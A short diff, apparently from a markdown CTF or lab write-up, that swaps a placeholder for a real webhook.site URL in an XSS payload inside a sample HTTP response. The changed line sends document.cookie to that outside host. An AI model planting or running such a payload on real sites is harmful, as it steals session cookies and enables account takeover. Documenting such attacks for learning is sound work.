@@ -9,7 +9,7 @@ HTTP/1.1 200 OK
 Content-type: text/html
 Content-length: 102
 
-<script>fetch(`[hook]?${document.cookie}`)</script>
+<script>fetch(`https://webhook.site/7c0b4f46-d927-4d8e-8601-3d70d049fe4c?${document.cookie}`)</script>
 ```
 
 ![hook response](hook.png)
